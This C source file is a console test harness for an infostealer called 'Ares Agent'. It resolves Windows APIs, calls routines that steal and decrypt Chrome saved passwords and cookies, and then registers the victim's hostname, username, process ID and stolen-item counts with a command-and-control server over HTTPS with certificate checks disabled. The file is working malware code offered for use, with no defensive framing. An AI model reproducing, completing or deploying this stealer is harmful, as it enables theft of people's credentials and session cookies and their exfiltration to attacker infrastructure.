/*
 * Ares Agent — Live Test (console mode)
 * 1. Resolve APIs
 * 2. Steal Chrome creds
 * 3. Steal cookies
 * 4. Connect to C2 and send data
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "ares_agent.h"
#include "ares_resolve.h"
#include "ares_strings.h"
#include <shlobj.h>

int main()
{
    printf("=== ARES AGENT TEST (v2.2) ===\n\n");

    /* Phase 1: Resolve APIs */
    printf("[*] Phase 1: Resolving APIs...\n");
    if (!Ares_ResolveAPIs()) {
        printf("[!] API resolution FAILED!\n");
        printf("    WinHTTP: %s\n", p_WinHttpOpen ? "OK" : "FAIL");
        printf("    Crypt32: %s\n", p_CryptUnprotectData ? "OK" : "FAIL");
        printf("    BCrypt:  %s\n", p_BCryptDecrypt ? "OK" : "FAIL");
        return 1;
    }
    printf("[+] All APIs resolved OK\n\n");

    /* Phase 2: Steal Chrome Credentials */
    printf("[*] Phase 2: Stealing browser credentials...\n");
    DECRYPTED_CRED creds[50];
    int ncreds = Ares_StealChromeCreds(creds, 50);
    printf("[+] Found %d credentials\n", ncreds);

    for (int i = 0; i < ncreds && i < 10; i++) {
        printf("  [%d] %s | %s | %s | decrypt: %s\n",
            i+1, creds[i].browser,
            creds[i].url,
            creds[i].username,
            creds[i].decrypt_status);
        if (strcmp(creds[i].decrypt_status, "ok") == 0) {
            /* Mask password */
            int plen = (int)strlen(creds[i].password);
            if (plen > 0) printf("       pass: %c***%c (%d chars)\n",
                creds[i].password[0], creds[i].password[plen-1], plen);
        }
    }

    /* Phase 3: Steal Cookies */
    printf("\n[*] Phase 3: Stealing cookies...\n");
    STOLEN_COOKIE cookies[100];
    int ncookies = Ares_StealChromeCookies(cookies, 100);
    printf("[+] Found %d cookies\n", ncookies);

    for (int i = 0; i < ncookies && i < 5; i++) {
        printf("  [%d] %s | %s | %s=%s\n",
            i+1, cookies[i].browser, cookies[i].host,
            cookies[i].name, strlen(cookies[i].value) > 0 ? "(has value)" : "(empty)");
    }

    /* Phase 4: Test C2 Connection */
    printf("\n[*] Phase 4: Testing C2 connection to 127.0.0.1:8443...\n");
    wchar_t whost[] = L"127.0.0.1";

    HINTERNET hSession = p_WinHttpOpen(
        L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { printf("[!] WinHttpOpen failed\n"); goto done; }

    HINTERNET hConnect = p_WinHttpConnect(hSession, whost, 8443, 0);
    if (!hConnect) { printf("[!] WinHttpConnect failed\n"); goto done; }

    HINTERNET hRequest = p_WinHttpOpenRequest(hConnect, L"POST",
        L"/api/v1/register", NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { printf("[!] WinHttpOpenRequest failed\n"); goto done; }

    DWORD secFlags = 0x00003300; /* IGNORE_ALL_CERT_ERRORS */
    p_WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    p_WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);

    char regBody[512];
    char hostname[128] = {0};
    DWORD hsize = sizeof(hostname);
    GetComputerNameA(hostname, &hsize);
    char username[128] = {0};
    DWORD usize = sizeof(username);
    GetUserNameA(username, &usize);

    int n = snprintf(regBody, sizeof(regBody),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows\",\"arch\":\"x64\","
        "\"pid\":%lu,\"creds_count\":%d,\"cookies_count\":%d}",
        hostname, username, GetCurrentProcessId(), ncreds, ncookies);

    printf("[*] Sending registration: %s\n", regBody);

    BOOL sent = p_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)regBody, n, n, 0);

    if (sent && p_WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD statusCode = 0, scSize = sizeof(statusCode);
        p_WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &scSize, NULL);
        printf("[+] C2 responded with status: %lu\n", statusCode);

        char respBuf[4096] = {0};
        DWORD avail, rd, total = 0;
        while (p_WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
            p_WinHttpReadData(hRequest, respBuf + total, avail, &rd);
            total += rd;
            if (total >= sizeof(respBuf) - 1) break;
        }
        respBuf[total] = '\0';
        printf("[+] C2 response body: %s\n", respBuf);
    } else {
        printf("[!] C2 connection failed: %lu\n", GetLastError());
    }

    p_WinHttpCloseHandle(hRequest);
    p_WinHttpCloseHandle(hConnect);
    p_WinHttpCloseHandle(hSession);

done:
    printf("\n=== TEST COMPLETE ===\n");
    printf("Creds: %d | Cookies: %d\n", ncreds, ncookies);
    return 0;
}
